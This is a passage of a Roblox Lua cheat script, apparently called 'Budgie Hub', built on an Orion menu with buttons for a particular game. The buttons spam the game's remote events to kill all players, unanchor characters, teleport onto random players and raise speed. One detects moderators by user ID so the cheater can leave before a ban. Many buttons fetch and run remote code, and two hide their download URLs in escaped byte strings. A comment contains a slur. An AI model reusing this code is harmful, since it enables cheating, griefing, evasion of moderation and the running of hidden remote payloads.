 workspace.CurrentCamera.CameraType = "Custom"
 speaker.CameraMinZoomDistance = 0.5
 speaker.CameraMaxZoomDistance = 400
 speaker.CameraMode = "Classic"
 speaker.Character.Head.Anchored = false
   end    
})

Tab:AddButton({
 Name = "Auto Defrost",
 Callback = function()
        while true do
  wait()
for i, v in pairs(game:GetService("Players"):GetPlayers()) do
   task.spawn(function()
    for i, x in next, v.Character:GetDescendants() do
     if x.Name ~= floatName and x:IsA("BasePart") and x.Anchored then
      x.Anchored = false
     end
    end
   end)
end
end
   end    
})

Tab:AddButton({
 Name = "Admin Detector(Beta)",
 Callback = function()
        local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Mobile%20Friendly%20Orion')))()
local playerIds = {
    1834719600,
    3310748483,
    6004546351, -- Juvenile cunt
    5815613848,
    2706883387,
    4386335082,
    2829558814, -- Owner
}

local function checkPlayers()
    for _, player in pairs(game.Players:GetPlayers()) do
        if table.find(playerIds, player.UserId) then
            Spooky = Instance.new("Sound", game.Workspace)
            Spooky.Name = "Spooky"
            Spooky.SoundId = "rbxassetid://5304042701"
            Spooky.Volume = 2.5
            Spooky.PlaybackSpeed = 1
            Spooky.Looped = true
            Spooky:Play()
            OrionLib:MakeNotification({
                Name = "Budgie Hub | Admin Detector",
                Content = "Attention! this function has detected a player with a suspicious ID, we advise you to leave the server as soon as possible so as not to get banned!",
                Image = "rbxassetid://4483345998",
                Time = 60
            })
            return
        end
    end

    task.wait(1)
    checkPlayers()
end

checkPlayers()
   end    
})

Tab:AddButton({
 Name = "Replication Abilities",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/ReplicationAbilityes/main/Gui"))()
   end    
})

Tab:AddButton({
 Name = "Shutdown",
 Callback = function()
        OrionLib:Destroy()
   end    
})

local Tab = Window:MakeTab({
	Name = "Extra",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
 Name = "Kill mode",
 Callback = function()
        for i = 1, 5 do
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("MalevolentShrine"):FireServer()
end
wait()
local args = {
    [1] = "Kenjaku"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(7)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Mini Uzumaki" then
       v.Parent = LP.Character
   end
end
 
for i = 1, 50 do
wait(0.5)
        local players = game:GetService("Players"):GetPlayers()

for _, player in ipairs(players) do
    if player.Character then
        local args = {
            [1] = player.Character.HumanoidRootPart.CFrame,
            [2] = 1000000
        }

        game:GetService("Players").LocalPlayer.Character:FindFirstChild("Mini Uzumaki").FireServer.RemoteEvent:FireServer(unpack(args))
    end
end
   end
   end    
})

Tab:AddButton({
 Name = "Killer mode",
 Callback = function()
        local args = {
    [1] = "Gyutaro"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

local function onTouch()
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Rampant Rampage" then
       v.Parent = LP.Character
   end
end
    for i = 1, 1 do
        game:GetService("Players").LocalPlayer.Character:FindFirstChild("Rampant Rampage").Punch.Event:FireServer()
    end
 wait(2.5)
 local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Rampant Arc" then
       v.Parent = LP.Backpack
   end
end
end

local function stopScript()
    game:GetService("UserInputService").TouchEnded:Disconnect(onTouch)
end

local function startScript()
    game:GetService("UserInputService").TouchEnded:Connect(onTouch)
end

repeat wait() until game.Players.LocalPlayer.Character
game.Players.LocalPlayer.CharacterAdded:Connect(function()
    startScript()
end)

if game.Players.LocalPlayer.Character then
    startScript()
else
    stopScript()
end

repeat
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
   game.Players.LocalPlayer.Character.Humanoid.JumpPower  = 75
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

Tab:AddButton({
 Name = "Hakari abilities pack",
 Callback = function()
local function toolOne()
local tool = Instance.new("Tool")
tool.Name = "Powerful ball"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 20 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Pachinko"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolTwo()
local tool = Instance.new("Tool")
tool.Name = "To cut in half"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 15 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ShutterDoors"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolThree()
local tool = Instance.new("Tool")
tool.Name = "Powerful beating"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 10 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("LuckyBeatdown"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolFour()
local tool = Instance.new("Tool")
tool.Name = "Spawn containers"
tool.RequiresHandle = false

tool.Activated:Connect(function()
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ContainerKick"):FireServer()
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolFive()
local tool = Instance.new("Tool")
tool.Name = "Transformation"
tool.RequiresHandle = false

tool.Activated:Connect(function()
game:GetService("ReplicatedStorage"):WaitForChild("Domainthing"):FireServer()
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolOne()
toolTwo()
toolThree()
toolFour()
toolFive()
     end
})

Tab:AddButton({
 Name = "Gojo abilities pack",
 Callback = function()
local function toolOnea()
local tool = Instance.new("Tool")
tool.Name = "Red"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 5 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Red"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolTwoa()
local tool = Instance.new("Tool")
tool.Name = "Blue"
tool.RequiresHandle = false

tool.Activated:Connect(function()
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Blue"):FireServer()
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolThreea()
local tool = Instance.new("Tool")
tool.Name = "Nuclear bomb"
tool.RequiresHandle = false

tool.Activated:Connect(function()
 for i = 1, 10 do
 local args = {
    [1] = "FinalHollowPurple"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Abilitys"):WaitForChild("Gojo"):FireServer(unpack(args))
 end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolOnea()
toolTwoa()
toolThreea()
     end
})

Tab:AddButton({
 Name = "Toji abilities pack",
 Callback = function()
local function toolOne()
local tool = Instance.new("Tool")
tool.Name = "Consecutive strikes"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 7 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Punches"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolTwo()
local tool = Instance.new("Tool")
tool.Name = "Swipe"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 10 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("PlayfulCloud"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolThree()
local tool = Instance.new("Tool")
tool.Name = "Death glare"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 20 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Vanishing"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolFour()
local tool = Instance.new("Tool")
tool.Name = "Limb rupture"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 5 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("DomainSlashes"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolFive()
local tool = Instance.new("Tool")
tool.Name = "Consecutive strikes 2"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 10 do
game:GetService("ReplicatedStorage"):WaitForChild("barrage"):WaitForChild("barrage"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolSex()
local tool = Instance.new("Tool")
tool.Name = "Fatal blows"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 3 do
game:GetService("ReplicatedStorage"):WaitForChild("barrage"):WaitForChild("jetbarrage"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolOne()
toolTwo()
toolThree()
toolFour()
toolFive()
toolSex()
    end
})

Tab:AddButton({
 Name = "Serious mode",
 Callback = function()
local function SeriousMode()
local args = {
    [1] = "Shadow"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.2)

local targetToolName = "Overdrive"

local player = game.Players.LocalPlayer
local function equipTool()
    local backpack = player.Backpack
    local character = player.Character

    local targetTool = backpack:FindFirstChild(targetToolName)
    if targetTool then
        targetTool.Parent = character
    end
end

equipTool()

game:GetService("Players").LocalPlayer.Character.Overdrive:FindFirstChild("Full Cowl").Event:FireServer()

wait(0.3)

local Player = game:GetService("Players").LocalPlayer
local Backpack = Player.Backpack
local Character = Player.Character
for _,v in pairs(Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end
end
for _,v in pairs(Character:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end 
end
end

SeriousMode()

local args = {
    [1] = "Garou"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
local function onTouch()
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Crushed Rock" then
       v.Parent = LP.Character
   end
end
    for i = 1, 5 do
       game:GetService("Players").LocalPlayer.Character:FindFirstChild("Crushed Rock").Punch.Event:FireServer()
   end
 wait(1)
 local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Crushed Rock" then
       v.Parent = LP.Backpack
   end
end
end

local function stopScript()
    game:GetService("UserInputService").TouchEnded:Disconnect(onTouch)
end

local function startScript()
    game:GetService("UserInputService").TouchEnded:Connect(onTouch)
end

repeat wait() until game.Players.LocalPlayer.Character
game.Players.LocalPlayer.CharacterAdded:Connect(function()
    startScript()
end)

if game.Players.LocalPlayer.Character then
    startScript()
else
    stopScript()
end

repeat
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 35
   game.Players.LocalPlayer.Character.Humanoid.JumpPower  = 75
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0

local function MyWoundsAreHealed()
repeat
  wait(0.2)
  if game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 150 or game:GetService("Players").LocalPlayer.Character.Humanoid.Health < 150 then
  local args = {
    [1] = "Garou"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
  end
 until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
 end
 
 MyWoundsAreHealed()
  end
})

Tab:AddButton({
 Name = "Hyperman",
 Callback = function()
        local function SeriousMode()
local args = {
    [1] = "Shadow"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.2)

local targetToolName = "Overdrive"

local player = game.Players.LocalPlayer
local function equipTool()
    local backpack = player.Backpack
    local character = player.Character

    local targetTool = backpack:FindFirstChild(targetToolName)
    if targetTool then
        targetTool.Parent = character
    end
end

equipTool()

game:GetService("Players").LocalPlayer.Character.Overdrive:FindFirstChild("Full Cowl").Event:FireServer()

wait(0.3)

local Player = game:GetService("Players").LocalPlayer
local Backpack = Player.Backpack
local Character = Player.Character
for _,v in pairs(Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end
end
for _,v in pairs(Character:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end 
end
end

SeriousMode()

local args = {
    [1] = "Goku Black"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

local function onTouch()
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Divine Bursttrough" then
       v.Parent = LP.Character
   end
end
    for i = 1, 8 do
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Divine Bursttrough").Punch.Event:FireServer()
end
 wait(1)
 local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Divine Bursttrough" then
       v.Parent = LP.Backpack
   end
end
end

local function stopScript()
    game:GetService("UserInputService").TouchEnded:Disconnect(onTouch)
end

local function startScript()
    game:GetService("UserInputService").TouchEnded:Connect(onTouch)
end

repeat wait() until game.Players.LocalPlayer.Character
game.Players.LocalPlayer.CharacterAdded:Connect(function()
    startScript()
end)

if game.Players.LocalPlayer.Character then
    startScript()
else
    stopScript()
end

repeat
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 35
   game.Players.LocalPlayer.Character.Humanoid.JumpPower  = 75
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0

local function Hit()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function onHealthChanged(health)
    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Vanish"):FireServer()
end

LocalPlayer.Character.Humanoid.HealthChanged:Connect(onHealthChanged)

if game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 then
LocalPlayer.Character.Humanoid.HealthChanged:Disconnect(onHealthChanged)
end
 end
 
 Hit()
 
 local function FcE()
local UserInputService = game:GetService("UserInputService")
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.E then
    local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Mortal Extinguisher" then
       v.Parent = LP.Character
   end
end
        for i = 1, 20 do
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Mortal Extinguisher").Punch.Event:FireServer()
 end
  wait(5)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Mortal Extinguisher" then
       v.Parent = LP.Backpack
   end
end
    end
 end)
end

FcE()
   end    
})

Tab:AddButton({
 Name = "Aura",
 Callback = function()
        local function SeriousMode()
local args = {
    [1] = "Shadow"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.2)

local targetToolName = "Overdrive"

local player = game.Players.LocalPlayer
local function equipTool()
    local backpack = player.Backpack
    local character = player.Character

    local targetTool = backpack:FindFirstChild(targetToolName)
    if targetTool then
        targetTool.Parent = character
    end
end

equipTool()

game:GetService("Players").LocalPlayer.Character.Overdrive:FindFirstChild("Full Cowl").Event:FireServer()

wait(0.3)

local Player = game:GetService("Players").LocalPlayer
local Backpack = Player.Backpack
local Character = Player.Character
for _,v in pairs(Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end
end
for _,v in pairs(Character:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end 
end
end

SeriousMode()
   end    
})

Tab:AddButton({
 Name = "Aura v2",
 Callback = function()
        local function SeriousMode()
local args = {
    [1] = "Shadow"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.2)

local targetToolName = "Overdrive"

local player = game.Players.LocalPlayer
local function equipTool()
    local backpack = player.Backpack
    local character = player.Character

    local targetTool = backpack:FindFirstChild(targetToolName)
    if targetTool then
        targetTool.Parent = character
    end
end

equipTool()

game:GetService("Players").LocalPlayer.Character.Overdrive:FindFirstChild("Full Cowl").Event:FireServer()

wait(0.3)

local Player = game:GetService("Players").LocalPlayer
local Backpack = Player.Backpack
local Character = Player.Character
for _,v in pairs(Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end
end
for _,v in pairs(Character:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end 
end
end

wait(0.5)
local function AuraZ()
local args = {
    [1] = "Ayanokoji"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(0.2)
local targetToolName = "Serious"

local player = game.Players.LocalPlayer
local function equipTool()
    local backpack = player.Backpack
    local character = player.Character

    local targetTool = backpack:FindFirstChild(targetToolName)
    if targetTool then
        targetTool.Parent = character
    end
end

equipTool()
wait(0.2)
game:GetService("Players").LocalPlayer.Character.Serious:FindFirstChild("Full Cowl").Event:FireServer()

wait(0.3)
local Player = game:GetService("Players").LocalPlayer
local Backpack = Player.Backpack
local Character = Player.Character
for _,v in pairs(Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end
end
for _,v in pairs(Character:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end 
end
end

AuraZ()
SeriousMode()
   end    
})

Tab:AddButton({
 Name = "Flash",
 Callback = function()
local args = {
    [1] = "Vergil"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/TestingSFAnMB/main/Test"))()
repeat
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
   game.Players.LocalPlayer.Character.Humanoid.JumpPower  = 100
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
  end    
})

Tab:AddButton({
 Name = "Mega Zoro",
 Callback = function()
        local args = {
    [1] = "Zoro"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/MegaZoro/main/Gui"))()
repeat
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 35
   game.Players.LocalPlayer.Character.Humanoid.JumpPower  = 70
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

Tab:AddButton({
 Name = "Reaper",
 Callback = function()
local args = {
    [1] = "Asta Demon"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/Reaper/main/Gui"))()
   end
})

Tab:AddButton({
 Name = "Electro",
 Callback = function()
 local args = {
    [1] = "Green Hero"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/Electro/main/Gui"))()
        repeat
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 35
   game.Players.LocalPlayer.Character.Humanoid.JumpPower  = 100
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

Tab:AddButton({
 Name = "Cursed",
 Callback = function()
 local args = {
    [1] = "Yuta"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/Cursed/main/Gui"))()
        repeat
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 25
   game.Players.LocalPlayer.Character.Humanoid.JumpPower  = 65
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

Tab:AddButton({
 Name = "Mega Giyu",
 Callback = function()
 local args = {
    [1] = "Giyu"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/MegaGiyu/main/Gui"))()
  local Wd = 25
repeat
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Wd
   game.Players.LocalPlayer.Character.Humanoid.JumpPower  = 65
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

Tab:AddButton({
 Name = "Denji Gui",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/Denji/main/Gui"))()
   end    
})

Tab:AddButton({
 Name = "Server breaker(V)",
 Callback = function()
        loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\65\68\83\75\101\114\79\102\102\105\99\97\108\47\86\105\112\49\47\109\97\105\110\47\65\110\77\34\41\41\40\41\10")()
   end    
})

Tab:AddButton({
 Name = "Punish Player(V)",
 Callback = function()
local args = {
    [1] = "Ayanokoji"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\65\68\83\75\101\114\79\102\102\105\99\97\108\47\86\105\112\50\47\109\97\105\110\47\65\110\77\34\41\41\40\41\10")()
   end    
})

Tab:AddButton({
 Name = "Super Rage Mode",
 Callback = function()
        local function SeriousMode()
local args = {
    [1] = "Shadow"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.2)

local targetToolName = "Overdrive"

local player = game.Players.LocalPlayer
local function equipTool()
    local backpack = player.Backpack
    local character = player.Character

    local targetTool = backpack:FindFirstChild(targetToolName)
    if targetTool then
        targetTool.Parent = character
    end
end

equipTool()

game:GetService("Players").LocalPlayer.Character.Overdrive:FindFirstChild("Full Cowl").Event:FireServer()

wait(0.3)

local Player = game:GetService("Players").LocalPlayer
local Backpack = Player.Backpack
local Character = Player.Character
for _,v in pairs(Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end
end
for _,v in pairs(Character:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end 
end
end

wait(0.5)
local function AuraZ()
local args = {
    [1] = "Ayanokoji"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(0.2)
local targetToolName = "Serious"

local player = game.Players.LocalPlayer
local function equipTool()
    local backpack = player.Backpack
    local character = player.Character

    local targetTool = backpack:FindFirstChild(targetToolName)
    if targetTool then
        targetTool.Parent = character
    end
end

equipTool()
wait(0.2)
game:GetService("Players").LocalPlayer.Character.Serious:FindFirstChild("Full Cowl").Event:FireServer()

wait(0.3)
local Player = game:GetService("Players").LocalPlayer
local Backpack = Player.Backpack
local Character = Player.Character
for _,v in pairs(Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end
end
for _,v in pairs(Character:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end 
end
end

AuraZ()
SeriousMode()

local function toolOne()
local tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Container Cataclysm"

local isEnabled = false

local function onActivated()
    isEnabled = not isEnabled

    if not isEnabled then return end
while isEnabled and wait(0.2) do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ContainerKick"):FireServer()
  end
end

tool.Activated:Connect(onActivated)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolOne()

local function toolTwo()
local tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Crowd Buster"

local isEnabled = false

local function onActivated()
    isEnabled = not isEnabled

    if not isEnabled then return end
while isEnabled and wait(0.3) do
for i = 1, 10 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Vanishing"):FireServer()
end
  end
end

tool.Activated:Connect(onActivated)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolTwo()

local function toolThree()
local tool = Instance.new("Tool")
tool.Name = "Bloodlust"
tool.RequiresHandle = false

tool.Activated:Connect(function()
local count = 0
last_pick_sin_mrazy = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame 
for i = 1, 15 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("DomainSlashes"):FireServer()
end
repeat
count = count + 1
    local players = game.Players:GetPlayers()
    local randomPlayer = players[math.random(1, #players)]
    
    if randomPlayer ~= game.Players.LocalPlayer then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = randomPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, -2, 0)
    end
    
    wait()
until count == 60
wait(0.2)

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = last_pick_sin_mrazy
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolThree()

local function toolFour()
local tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Strikes of the Gods"

local isEnabled = false

local function onActivated()
    isEnabled = not isEnabled

    if not isEnabled then return end
while isEnabled and wait(0.) do
for i = 1, 1 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Punches"):FireServer()
end
  end
end

tool.Activated:Connect(onActivated)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolFour()

local function toolSeven()
local tool = Instance.new("Tool")
tool.Name = "Plasma"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 20 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Blue"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolSeven()

local function toolFive()
local tool = Instance.new("Tool")
tool.Name = "Big Bang"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 25 do
 local args = {
    [1] = "FinalHollowPurple"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Abilitys"):WaitForChild("Gojo"):FireServer(unpack(args))
 end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolFive()

local function toolSix()
local tool = Instance.new("Tool")
tool.Name = "Domain of Death"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 5 do
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("MalevolentShrine"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolSix()
   end    
})

Tab:AddButton({
 Name = "Gojo Infinity Void",
 Callback = function()
        local player = game.Players.LocalPlayer

local hasTool = false
for _, tool in ipairs(player.Backpack:GetChildren()) do
    if tool.Name == "Infinity Void" then
        hasTool = true
        break
    end
end

if not hasTool then
  local function F1()
    local args = {
    [1] = "Gojo"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(0.5)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "One Six Eyes" then
       v.Parent = LP.Character
   end
end
wait(0.1)
game:GetService("Players").LocalPlayer.Character:FindFirstChild("One Six Eyes").Script.Event:FireServer()
  end
  
  local function F2()
wait(6)
game:GetService("Players").LocalPlayer.Backpack["Infinity Void"].Skill.InfinityVoid:FireServer()
end
  
  F1()
  F2()
end

if hasTool then
game:GetService("Players").LocalPlayer.Backpack["Infinity Void"].Skill.InfinityVoid:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Gojo Unlimited Void",
 Callback = function()
        local player = game.Players.LocalPlayer

local hasTool = false
for _, tool in ipairs(player.Backpack:GetChildren()) do
    if tool.Name == "Six Eyes" then
        hasTool = true
        break
    end
end

if not hasTool then
  local function F1()
    local args = {
    [1] = "Gojo"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(0.5)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "One Six Eyes" then
       v.Parent = LP.Character
   end
end
wait(0.1)
game:GetService("Players").LocalPlayer.Character:FindFirstChild("One Six Eyes").Script.Event:FireServer()
  end
  
  local function F2()
wait(6)
game:GetService("Players").LocalPlayer.Backpack["Unlimited Void 0,2s"].Domain.Event:FireServer()
end
  
  F1()
  F2()
end

if hasTool then
game:GetService("Players").LocalPlayer.Backpack["Unlimited Void 0,2s"].Domain.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "All Range Atomic",
 Callback = function()
        local player = game.Players.LocalPlayer

local hasTool = false
for _, tool in ipairs(player.Backpack:GetChildren()) do
    if tool.Name == "All Range Atomic" or tool.Name == "AtomicFolder" then
        hasTool = true
        break
    end
end

if not hasTool then
  local args = {
    [1] = "Shadow"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(0.5)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "All Range Atomic" or v.Name == "AtomicFolder" then
       v.Parent = LP.Character
   end
end
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("AtomicFolder"):WaitForChild("Event"):FireServer() 
  end

if hasTool then
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
